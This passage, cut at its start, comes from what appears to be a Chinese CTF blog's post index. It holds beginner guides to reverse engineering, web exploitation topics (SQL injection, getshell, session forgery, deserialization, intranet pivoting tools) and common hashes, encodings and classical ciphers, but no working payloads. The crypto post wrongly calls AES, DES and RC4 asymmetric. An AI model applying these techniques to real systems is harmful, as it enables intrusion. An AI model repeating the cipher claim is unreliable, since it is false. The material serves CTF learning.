们打开来实际上是一些二进制数据。\n 例如下面这一段程序源码\n#include &lt;stdio.h&gt;int main()&#123;printf(&quot;Hello world&quot;);&#125;\n\n我们使用记事本打开就能看到逻辑。但是真正编译出来的，我们用来运行的程序，使用 记事本打开是这样的\n\n这些二进制数据直接无法识读，但是包含了程序执行所需要的东西，而我们的工作就 是，识读他们，找到flag！\n如何开始逆向呢ctf中的逆向（ reverse ）涉及很多编程语言，最常见的是C、C++ 、python、java、C#，或者一 常见的编程语言golang、rust、lisp等等。 除了windows与linux系统下可执行文件的逆向，还经常遇到安卓的（ apk ）逆向、系统驱动、固 件逆向等等。 但是作为一个 beginner ，你不需要在刚入门的时候就去掌握这么多的编程语言 从C语言以及C语言逆向开始，是一个比较好的选择 因为C语言十分接近高级语言，又有充分的系统底层的支持 同时入门的逆向题很多是用C语言写的 并且当你学会了C语言，尽管你无法使用java、python等语言进行编程，但是你会发现，看懂这些高 语言写的代码还是比较容易的。\n常用工具\n来自含树\n\n常用工具介绍1．IDA ProIDA（Interactive DisAssembler）Pro（以下简称IDA）是一款强大的可执行文件分析工 具，可以对包括但不限于x86&#x2F;x64、ARM、MIPS等架构，PE、ELF等格式的可执行文件进行静态分析和动态调试。IDA集成了Hex-Rays Decompiler，提供了从汇编语言到C 语言伪代码的反编译功能，可以极大地减少分析程序时的工作量\n2．OllyDbg和x64dbgOllyDbg是Windows 32位环境下一款优秀的调试器，最强大的功能是可扩展性，许多开 发者为其开发了具备各种功能的插件，能够绕过许多软件保护措施。但OllyDbg在64位 环境下已经不能使用，许多人因此转而使用了x64dbg。\n这些怎么下载？爱盘 - 最新的在线破解工具包 (52pojie.cn)\n下好了怎么用呢推荐查阅一些书籍，如 《从0到1：CTFer成长之路》 re篇 \n或者直接b站搜ctf re入门\n 以及第一题的bin在压缩包里，试试ida吧，你会需要它的。\n","categories":["CTF","CTF入门指北"],"tags":["CTF"]},{"title":"CTF入门指北——web","url":"/posts/c162917a.html","content":"moectf2023 web 入门指南Klutton\n知识和资源的获取前言\nctf知识的学习与课内一板一眼式的教书不同，如果你想要获得成长的能力，那么你 必须 获取 自主获取知识 的 能力，如果你是一个初学者，这是一个脱离以前填鸭式应试教育的学习模式，你需要不得不逐步适应新的学习 方式， 这样的能力不管在哪个方向，甚至在别的竞赛学科中，都是必要的 \n这样的学习方式是受益终生的，不是吗？\n从公开资源获取知识和资源这个目录表是有难易顺序的，因为每一个途径都需要一定的经验和知识才能掌握\n搜索引擎优先选择bing和google\n 不会就先搜，搜索引擎的速度肯定比管理员回消息快\n 在上面两引擎信息不足情况下考虑其他引擎\n人工智能随着时代的发展，从2023年（笔者确信）开始，无论国内外，语言模型的发展使得我们可以大概 地与人工智能沟通获取知识，人工智能不怕累、不怕麻烦，值得重复问一些简单问题\n如果不知道怎么弄，请接着看下面的内容\nGitHub等开源社区搜索关键词，可能有热心的开源作者汇集的一些某某大全形式的攻击载荷，忘了就去翻翻嘛\n例子： \n​\t\tPayloadsAlltheThings —— payload大全 \n​\t\tvulhub的docker（需要会使用搭配相应漏洞知识）\n如果觉得你访问的仓库有价值，不妨给仓库一个一个star\n从私下获取资源有些知识在互联网上传播是有风险的，例如怎么上GitHub，我老是上不去，不妨私下问问你的室友如何解决 或 者你可以陪我跑跑山吃吃饭的时候聊一聊\n例如：chatgpt不允许国内访问；openai的账号注册需要外国手机号码\n那你可以找朋友问一问，借一借\n从私下获取知识那就和问老师问题一样嘛（而且老师还比同学多出来一个教人的义务），主要几点\n不要问“在吗？”一类的字眼，言语谦逊地完整提出问题再等待答复 \n被提问者不一定了解具体的细节，要及时补充要求的具体内容\n如果被问者也不知道，请原谅他 \n如果认为受益匪浅，不妨给出物质上的答谢\n综上，遇到不会的怎么办把你认为是特征内容的复制下来 \n扔给上面提到的资源\n如何练习一些练习场buuoj \nbugku （可以看三哈师傅的网站了解更多平台）https://www.su-sanha.cn/platforms\n需要知道的：靶场分普通的ctf靶场，有的是awd或者awdp，有的则是给你一个虚拟机自己从头到尾拿下系统 权限（vulnhub）最前者是最基础的，如果想要了解完整真实的渗透流程，可以去尝试vulnhub这类网站\n学会查看题解write up（wp）在平时的练习中，肯定会遇到不会的题，千万不要死磕，不会就看wp，下一道更好！ 在搜索引擎或者开源社 区查找wp，在看wp的过程中，补充并且掌握自己的不会的知识点\n如何配置环境一定要有耐心！ 一套环境不是十分钟二十分钟就能配完的，对于新手而言，几天甚至一两周都有可能，反复地 确认自己的步骤、教程的日期、教程使用的系统版本是否正确；\n尽量选择官方网站的配置方式：寻找document字样去看文档，这是最稳的方法，但是比较费力； 可以去看私 人的文章，但不一定能成功\n熟能生巧\n可以自己尝试配置一套lamp环境，或者配一台虚拟机，运行一个docker\n一些知识清单编码\n在网络传输中，数据被编码成为二进制内容经过网络传输之后解码，由于在这个过程中应用了不同的规则，只 有使用了相应的编码才能正确地解析内容，有很多编码形式需要你了解（正经和不正经的），在深度了解编码 规则后，你甚至可以自创独属于你的编码规则！\n可供参考的资料：https://www.cnblogs.com/ruoli-s/p/14206145.html\n编程语言\n当提到计算机，不可避免地需要了解编程，事实上，已经存在相当多主流的编程语言，有一些适用于提供和处 理web服务，例如python, java, php, golang, rust，你需要具备对于这些代码最少有审计能力（看得懂在做什么）\n工具\n够用： \n​\tpostman \n​\tburp \n​\tsqlmap\n计网知识 \n​\t标准的OSI七层模型（其实了解tcp足矣） \n​\t了解 “协议”（例如http，https，ftp，gopher，也需要了解php伪协议）\nHTTP \n​\t请求方法（get&#x2F;post） \n​\t请求内容（json&#x2F;raw&#x2F;binary） \n​\t请求头（content-type&#x2F;xff&#x2F;referer&#x2F;cookie）\n服务框架\n​\t有现成的网络框架用于高效并发处理请求，所以你需要了解函数是干嘛用的，怎么处理请求的\n​\t\tpython: Flask, Django, Tornado \n​\t\tjava: Spring Boot\n用户凭证\n​\thttp是无状态协议，因此需要储存处理用户信息，你需要了解：\n​\t\tcookie \n​\t\tsession \n​\t\tjwt\n​\t有时会涉及到用户信息伪造，例如flask框架下的session伪造，通过获取（或者弱口令爆破）secret_key来伪造 一个session，通常需要自己写脚本（或者获取GitHub现成的脚本改一改使用）\n数据储存\n实际上，大部分持久化信息是储存在数据库的，有的出题人为了简化流程也会直接把信息储存在内存里\n数据库管理系统（DBMS）\n​\t你需要知道去哪儿了解不同DBMS的sql语法，以便完成相应的挑战：\n​\t\tsql injection注入：查询脚本由于过滤不严导致查询语句可控，用户得以访问数据库\n​\t\t\t\t有回显\n​\t\t\t\t盲注\n​\t\t文件读写：通过数据库进行文件的读写，可以配合起来getshell\n（sql注入可以尝试sqlmap一把梭，前提是你找对了注入点）\n反序列化\n反序列化一直是一个离不开的话题，大体来说，序列化就是把内存里处理好的数据变成二进制内容（通常）用 来传输或储存；反序列化就是按照序列化的规则的把内容读取到内存中参与程序运行；如果反序列化不得当， 被恶意构造的内容就可能导致机器被”骇入”\nxxe（xml外部实体攻击 libxml 2.8.0以下） \nphp反序列化（包括了解其中的魔术方法）\npickle反序列化（可能会有r指令过滤不过涉及出题不多）\njava反序列化（pop链）\nCMS\n​\t\t上网查吧（杂 \n​\t\t内网渗透\n代理工具\n配置socks代理，继续进行内网渗透 \n​\t\tnps \n​\t\tfrp \n​\t\tproxifier \n​\t\tproxychains\n扫描工具 \n发现内网资产 \n​\t\tnmap\n​\t\tfscan\n结束祝你能玩得愉快，学得愉快！\n\n666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959 6c396a61474673624756755a3055684958303d\n","categories":["CTF","CTF入门指北"],"tags":["CTF"]},{"title":"CTF学习日记（每天学点新东西，就是成功）","url":"/posts/cdf7e434.html","content":"（坚持一天一更新……可能吧）\n2023年12月11日今天学点不一样的\nbat批处理相关知识\n每次都要输入命令，我干脆直接用bat批处理，点一下就好了\nhttps://blog.csdn.net/qq_41428418/article/details/132438144#/\nhttps://blog.csdn.net/s_y_w123/article/details/111353912#/\nhttps://github.com/Aloxaf/MirageTankGo#/\n解决了我没解决的问题\nget√\n2023年12月9日文件头文件尾的知识点https://w1ndys.top/2023/12/09/CTF-misc-fileheader/#/\n2023年11月14日今天打技能兴鲁省赛线上初赛，有个很有意思的杂项题，附件解压是一个日历表\n2023年11月13日RE\nPython字符串，列表，元组，字典的区别\n\n特别提一下：\nflag创建为列表的时候用join函数拼接\nflag创建为字符串的时候用+&#x3D;拼接\nPython 字符串字符串是 Python 中最常用的数据类型。我们可以使用引号 ( ‘ 或 “ ) 来创建字符串。\n创建字符串很简单，只要为变量分配一个值即可。例如：\nvar1 = &#x27;Hello World!&#x27;var2 = &quot;Python Runoob&quot;\n\nPython 列表(List)序列是Python中最基本的数据结构。序列中的每个元素都分配一个数字 - 它的位置，或索引，第一个索引是0，第二个索引是1，依此类推。\nPython有6个序列的内置类型，但最常见的是列表和元组。\n序列都可以进行的操作包括索引，切片，加，乘，检查成员。\n此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。\n列表是最常用的Python数据类型，它可以作为一个方括号内的逗号分隔值出现。\n列表的数据项不需要具有相同的类型\n创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。如下所示：\nlist1 &#x3D; [‘physics’, ‘chemistry’, 1997, 2000] list2 &#x3D; [1, 2, 3, 4, 5 ] list3 &#x3D; [“a”, “b”, “c”, “d”]\n与字符串的索引一样，列表索引从0开始。列表可以进行截取、组合等。\nPython 元组Python 的元组与列表类似，不同之处在于元组的元素不能修改。\n元组使用小括号，列表使用方括号。\n元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。\n如下实例：\n实例(Python 2.0+)tup1 &#x3D; (‘physics’, ‘chemistry’, 1997, 2000) tup2 &#x3D; (1, 2, 3, 4, 5 ) tup3 &#x3D; “a”, “b”, “c”, “d”\n创建空元组\ntup1 = ()\n\n元组中只包含一个元素时，需要在元素后面添加逗号\ntup1 = (50,)\n\n元组与字符串类似，下标索引从0开始，可以进行截取，组合等。\nPython 字典(Dictionary)字典是另一种可变容器模型，且可存储任意类型对象。\n字典的每个键值 key:value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中 ,格式如下所示：\nd &#x3D; {key1 : value1, key2 : value2 }\n注意：****dict 作为 Python 的关键字和内置函数，变量名不建议命名为 dict。\n键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一。\n&gt;&gt;&gt; tinydict &#x3D; {‘a’: 1, ‘b’: 2, ‘b’: ‘3’}&gt;&gt;&gt; tinydict[‘b’]‘3’&gt;&gt;&gt; tinydict{‘a’: 1, ‘b’: ‘3’}\n值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。\n一个简单的字典实例：\ntinydict &#x3D; {‘Alice’: ‘2341’, ‘Beth’: ‘9102’, ‘Cecil’: ‘3258’}\n也可如此创建字典：\ntinydict1 &#x3D; { ‘abc’: 456 } tinydict2 &#x3D; { ‘abc’: 123, 98.6: 37 }\n2023年11月11日rePython逆序输出\nprint(flag[::-1])\n\n实际上这是切片的一些操作\nPython切片操作_小魔王降临的博客-CSDN博客\n","categories":["CTF"],"tags":["CTF","CTF学习笔记"]},{"title":"CTF密码学常见密码形式","url":"/posts/965c7bf3.html","content":"\n声明：本文基于https://cloud.tencent.com/developer/article/1748394\n这篇文章进行修改，转载请注明来源，感谢支持\n未写完，持续更新中……\n\nMD5、sha1、HMAC算法、NTLM等相似加密类型常用解密网站\nhttps://www.somd5.com/\nhttps://pmd5.com/\nhttp://www.ttmd5.com/（带批量解密工具）\n\n1、MD5——示例21232F297A57A5A743894A0E4A801FC3一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。\n根据md5加密后的特征（md5加密后是16位或者32位的字符，由字母和数字组成，字母大小写统一）可以尝试md5解密。（TIP：有时候我们获得到的 md5 是 16 位的，其实那 16 位是 32 位 md5 的长度，是从 32 位 md5 值来的。是将 32 位 md5 去掉前八位，去掉后八位得到的）\nmd5的三个特征：\n\n确定性：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。\n碰撞性：原始数据与其MD5值并不是一一对应的，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。\n不可逆：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够强，这是由它的算法所决定的。因为根据第2点，一个给定的MD5值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。\n\n2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997这种加密的密文特征跟MD5差不多，只不过位数是40\n3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的\n3、NTLM——示例209c6174da490caeb422f3fa5a7ae634这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。\n相似加密类型\n\n\n#\n算法\n长度\n\n\n\n1\nmd5\n32&#x2F;16\n\n\n2\nsha1\n40\n\n\n3\nsha256\n64\n\n\n4\nsha512\n128\n\n\n5\nadler32\n8\n\n\n6\ncrc32\n8\n\n\n7\ncrc32b\n8\n\n\n8\nfnv132\n8\n\n\n9\nfnv164\n16\n\n\n10\nfnv1a32\n8\n\n\n11\nfnv1a64\n16\n\n\n12\ngost\n64\n\n\n13\ngost-crypto\n64\n\n\n14\nhaval128,3\n32\n\n\n15\nhaval128,4\n32\n\n\n16\nhaval128,5\n32\n\n\n17\nhaval160,3\n40\n\n\n18\nhaval160,4\n40\n\n\n19\nhaval160,5\n40\n\n\n20\nhaval192,3\n48\n\n\n21\nhaval192,4\n48\n\n\n22\nhaval192,5\n48\n\n\n23\nhaval224,3\n56\n\n\n24\nhaval224,4\n56\n\n\n25\nhaval224,5\n56\n\n\n26\nhaval256,3\n64\n\n\n27\nhaval256,4\n64\n\n\n28\nhaval256,5\n64\n\n\n29\njoaat\n8\n\n\n30\nmd2\n32\n\n\n31\nmd4\n32\n\n\n32\nripemd128\n32\n\n\n33\nripemd160\n40\n\n\n34\nripemd256\n64\n\n\n35\nripemd320\n80\n\n\n36\nsha224\n56\n\n\n37\nsha3-224\n56\n\n\n38\nsha3-256\n64\n\n\n39\nsha3-384\n96\n\n\n40\nsha3-512\n128\n\n\n41\nsha384\n96\n\n\n42\nsha512&#x2F;224\n56\n\n\n43\nsha512&#x2F;256\n64\n\n\n44\nsnefru\n64\n\n\n45\nsnefru256\n64\n\n\n46\ntiger128,3\n32\n\n\n47\ntiger128,4\n32\n\n\n48\ntiger160,3\n40\n\n\n49\ntiger160,4\n40\n\n\n50\ntiger192,3\n48\n\n\n51\ntiger192,4\n48\n\n\n52\nwhirlpool\n128\n\n\n53\nmysql\n老MYSQL数据库用的，16位，且第1位和第7位必须为0-8\n\n\n54\nmysql5\n40\n\n\n55\nNTLM\n32\n\n\n56\nDomain Cached Credentials\n32\n\n\nBase64、Base58、Base32、Base16、Base85、Base100等相似加密类型1、Base64——示例YWRtaW4tcm9vdA==一般情况下密文尾部都会有两个等号，明文很少的时候则没有\nBase64编码要求把3个8位字节（38&#x3D;24）转化为4个6位的字节（46&#x3D;24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用‘&#x3D;’，因此编码后输出的文本末尾可能会出现1或2个‘&#x3D;’，如图。\n为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6&#x3D;64，这也是Base64名称的由来。\nBase64编码表\n\n\n\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n\n\n\n0\nA\n8\nI\n16\nQ\n24\nY\n32\ng\n40\no\n48\nw\n56\n4\n\n\n1\nB\n9\nJ\n17\nR\n25\nZ\n33\nh\n41\np\n49\nx\n57\n5\n\n\n2\nC\n10\nK\n18\nS\n26\na\n34\ni\n42\nq\n50\ny\n58\n6\n\n\n3\nD\n11\nL\n19\nT\n27\nb\n35\nj\n43\nr\n51\nz\n59\n7\n\n\n4\nE\n12\nM\n20\nU\n28\nc\n36\nk\n44\ns\n52\n0\n60\n8\n\n\n5\nF\n13\nN\n21\nV\n29\nd\n37\nl\n45\nt\n53\n1\n61\n9\n\n\n6\nG\n14\nO\n22\nW\n30\ne\n38\nm\n46\nu\n54\n2\n62\n+\n\n\n7\nH\n15\nP\n23\nX\n31\nf\n39\nn\n47\nv\n55\n3\n63\n&#x2F;\n\n\nBase64使用注意问题一、Base64和URL传参问题标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“&#x2F;”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。\n为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’&#x3D;’号，并将标准Base64中的“+”和“&#x2F;”分别改成了“-”和“_”，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。\n二、Base64和URL传参问题改善另有一种用于正则表达式的改进Base64变种，它将“+”和“&#x2F;”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。\n此外还有一些变种，它们将“+&#x2F;”改为“*-”或“.*”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“_:”（用于XML中的Name）。\n三、Base64转换后比原有的字符串长1&#x2F;3Base64要求把每三个8Bit的字节转换为四个6Bit的字节（38 &#x3D; 46 &#x3D; 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1&#x2F;3。\n四、Base64转换总结Base64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。\n2、Base58——示例6tmHCZvhgfNjQu它最大的特点是没有等号\nBase58是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。\n相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+“和”&#x2F;“符号。\n比特币的Base58字母表：\n123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\n简单的说：Base58一种编码方式，跟十进制，十六进制一样，不过更短更省空间。\nBase58的原理是什么？\n二进制：0和1\n十进制：1到10\n十六进制：十进制的基础上加上了A-F 六个字母\nBase58可以理解为一种58进制。\nBase58包含了阿拉伯数字、小写英文字母，大写英文字母。\n但是去掉了一些容易混淆的数字和字母：0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）\n3、Base32——示例GEZDGNBVGY3TQOJQGE======他的特点是明文超过十个后面就会有很多等号\nBase32使用了ASCII编码中可打印的32个字符(大写字母AZ和数字27)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组，由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位，则在编码后数据补充”&#x3D;”，一个”&#x3D;”相当于一个组(5个二进制位)，编码后的数据是原先的8&#x2F;5倍. Base32编码表\n\n\n\n值\n符号\n值\n符号\n值\n符号\n值\n符号\n\n\n\n0\nA\n8\nI\n16\nQ\n24\nY\n\n\n1\nB\n9\nJ\n17\nR\n25\nZ\n\n\n2\nC\n10\nK\n18\nS\n26\n2\n\n\n3\nD\n11\nL\n19\nT\n27\n3\n\n\n4\nE\n12\nM\n20\nU\n28\n4\n\n\n5\nF\n13\nN\n21\nV\n29\n5\n\n\n6\nG\n14\nO\n22\nW\n30\n6\n\n\n7\nH\n15\nP\n23\nX\n31\n7\n\n\n填充\n&#x3D;\n\n\n\n\n\n\n\n\nBase32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。\n由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。\n与Base64相比，Base32具有许多优点：\n\n适合不区分大小写的文件系统，更利于人类口语交流或记忆。\n结果可以用作文件名，因为它不包含路径分隔符 “&#x2F;”等符号。\n排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）。\n排除填充符号“&#x3D;”的结果可以包含在URL中，而不编码任何字符。\n\nBase32也比Base16有优势：\n\nBase32比Base16占用的空间更小。（1000比特数据Base32需要200个字符，而Base16则为250个字符）\n\nBase32的缺点：\n\nBase32比Base64多占用大约20％的空间。因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据。\n\n4、Base16——示例61646D696E它的特点是没有等号并且数字要多于字母\nBase16编码的方式：\n1.将数据(根据ASCII编码，UTF-8编码等)转成对应的二进制数，不足8比特位高位补0。然后将所有的二进制全部串起来，4个二进制位为一组，转化成对应十进制数。\n2.根据十进制数值找到Base16编码表里面对应的字符。Base16是4个比特位表示一个字符，所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符，现在转化成两个字符。数据量是原先的2倍。\n\n\n\n值\n编码\n值\n编码\n\n\n\n0\n0\n8\n8\n\n\n1\n1\n9\n9\n\n\n2\n2\n10\nA\n\n\n3\n3\n11\nB\n\n\n4\n4\n12\nC\n\n\n5\n5\n13\nD\n\n\n6\n6\n14\nE\n\n\n7\n7\n15\nF\n\n\nBase16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。\n5、Base85——示例@:X4hDWe0rkE(G[OdP4CT]N#特点是奇怪的字符比较多，但是很难出现等号\n6、Base100——示例👘👛👤👠👥特点就是一堆Emoji表情\nBase100编码&#x2F;解码工具（又名：Emoji表情符号编码&#x2F;解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。\n常用解密网站：Base64：\n\ntool.oschina.net\nwww.sojson.com\nbase64.us\n\nBase58：www.metools.info Base32、16：www.qqxiuzi.cn Base100：www.atoolbox.net\nAES、DES、RC4、Rabbit、Triple DES（3DES）这些都是非对称性加密算法，就是引入了密钥，密文特征与Base64类似，放个图，就不多说了\nUnicode、HTML实体编码、16进制Unicode1、Unicode——汉字示例这、字母示例t、数字符号示例5可以说Unicode与HTML实体编码是一个东西\nUnicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。\n2、HTML实体编码——示例与Unicode相同字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。\n这么做的目的主要有两个： １、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体： 小于号这样写：&lt; 或 &lt; 大于号这样写：&gt; 或 &gt; 前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。 ２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。\n2、16进制Unicode——示例\\u8fd9\\u662f\\u4e00常用解密网站：\nUnicode：www.sojson.com\n16进制Unicode：www.msxindl.com\nHTML字符实体：www.qqxiuzi.cn\n\nEscape编码&#x2F;加密、Unescape解码&#x2F;解密、%u编码、%u解码特征：以%u开头\nEscape&#x2F;Unescape加密解码&#x2F;编码解码,又叫%u编码，从以往经验看编码字符串出现有”u”，它是unicode编码，那么Escape编码采用是那一种unicode实现形式呢。其实是UTF-16BE模式。这样一来问题非常简单了。 Escape编码&#x2F;加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码&#x2F;解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！因为目前%字符，常用作URL编码，所以%u这样编码已经逐渐被废弃了！\n基本类型只对汉字进行编码，复杂类型是所有字符均可\n常用解密网站：http://web.chacuo.net/charsetescape/\nURL、Hex编码这两种加密的密文是一样的，不同的是当你用url编码网站时是不会把http进行编码的，而Hex编码则全部转化了\nencodeURIComponent() 函数 与 encodeURI() 函数的区别 请注意 encodeURIComponent() 函数 与 encodeURI() 函数的区别之处，前者假定它的参数是 URI 的一部分（比如协议、主机名、路径或查询字符串）。因此 encodeURIComponent() 函数将转义用于分隔 URI 各个部分的标点符号。\n常用解密网站：Hex编码：https://www.107000.com/T-Hex URL 编码：https://www.sojson.com/encodeurl.html\n凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码W型这几类密码原理都是移位调换加密，破解难度低\n常用解密网站\n\n维基利亚密码https://ctf.bugku.com/tool/vigenere\n栅栏密码https://ctf.bugku.com/tool/railfence\n凯撒密码https://ctf.bugku.com/tool/caesar\n\n1、凯撒密码——示例iodj&#123;khoor_zrug_123&#125;只对字母进行加密，常用于CTF比赛中\n凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。此为一种位移加密手段，只对26个（大小写）字母进行位移加密，规则相当简单，容易被破解。下面是明文字母表移回3位的对比： 明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W 密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 然后A变成D，B变成E，Z变成C。 字母最多可移动25位（按字母表）。通常为向后移动，如果您想向前移动1位，则相当于向后移动25位，位移选择为25位。\n2、维吉尼亚密码——示例fmcg&#123;iglmq_wptd_123&#125;可以说是凯撒密码的加强版，引入了密钥\n维吉尼亚密码，它将凯撒密码的所有26种排列放到一个表中，形成26行26列的加密字母表。此外，维吉尼亚密码必须有一个由字母组成的密钥，至少有一个字母，最多与明文字母有相同数量的字母。 在凯撒密码中，每个字母都会进行一定偏移值转换，例如，当偏移值是3时，则B被转换为E，C转换成F…。在维吉尼亚密码加密中，则是由具有不同偏移的凯撒密码构成的。 要生成密码，需要使用表格方法，此表(如图所示)包含26行字母表，每一行从上一行到左行被一位偏移。加密时使用哪一行字母表是基于密钥的，在加密过程中密钥会不断变化。 例如，假设明文为： BTTACKATDAFG 选择一个关键字并重复它以获得密钥，例如，当关键字是LIMN时，键是： LIMNLIMNLIMN 在明文中的第一个字母B，对应于密钥中的第一个字母L，使用加密字母表中的L行字母进行加密，得到第一个字母的密文M。同样，第二个明文字母是T，它用表中的I行加密，得到第二个密文B。通过类比，我们可以得到： 明文：BTTACKATDAFG 键：LIMNLIMNLIMN 密文：MBFNNSMGOIRT 解密的过程是加密的逆过程。例如，密钥的第一个字母对应的L行字母表，发现密文的第一个字母M位于B列，因此明文的第一个字母是B。密钥的第二个字母对应于I行字母表，而密文的第二个字母B位于该行的T列中，因此明文的第二个字母是T。等等，你可以得到明文。\n\n3、栅栏密码基础型栅栏密码是按一定规则将明文内容互相调换了位置\n栅栏密码(Rail fence Cipher)基础型加密方式，是一种简单的移动字符位置的加密方法，首先把加密的明文分成N个一组，然后把每组的第1、第2、第M个字符连起来，形成无规律的密文字符串。\n例如字符串“123456789abc”，首先将字符串分成3组，如下排列： 1234 5678 9abc 依次取每一组字符，组成加密后密文：“15926a37b48c”。\n4、栅栏密码W型栅栏密码W型加密算法： 栅栏密码(Rail fence Cipher)，扩展变种W型，采用先把明文类似”W”形状进行排列，然后再按栏目顺序1-N，取每一栏的所有字符值，组成加密后密文。 比如字符串“123456789”，采用栏目数为3的时，明文将采用如下排列： 1—5—9 -2-4-6-8- –3—-7– 取每一栏所有字符串，组成加密后密文：“159246837”。 W型栅栏密码加密方式，比传统型栅栏密码加密方法，算法略有增强，但目前已只能用于学习算法验证。\n文本隐藏加密、零宽隐写1、文本隐藏加密特征：加密过的密文会比原文的字节数多，当你按删除键的时候会发现某一处要按好多下才能把前面的字删掉\n原理**：它的原理是在密文中加入了不可见字符组成的编码，例如上述看似九个字符的一句话，通过字数查询可知它实际上有87个字符，多出的字符是由零宽空格实现的编码，因为零宽空格不占据空间，所以看不出它的存在。\n使用：在进行文本隐藏加密时，将需要隐藏的文字写在括号中，就像这样“你好（有才华），我好喜欢你（画的画）！”，然后加密即可隐藏括号内的文字。同时可以设定一个密码，这样只有知道密码的人才能解密隐藏的文字。密码可以是数字、字母和下划线，最多九位。\n2、零宽隐写特征：解密后明文与密文会分开显示，密文一般隐藏在第一个字后面，不信你试试，保证你十下之内删不完\n与上面文本隐藏加密的原理一样，但过程不一样\n常用解密网站：文本隐藏加密：www.qqxiuzi.cn 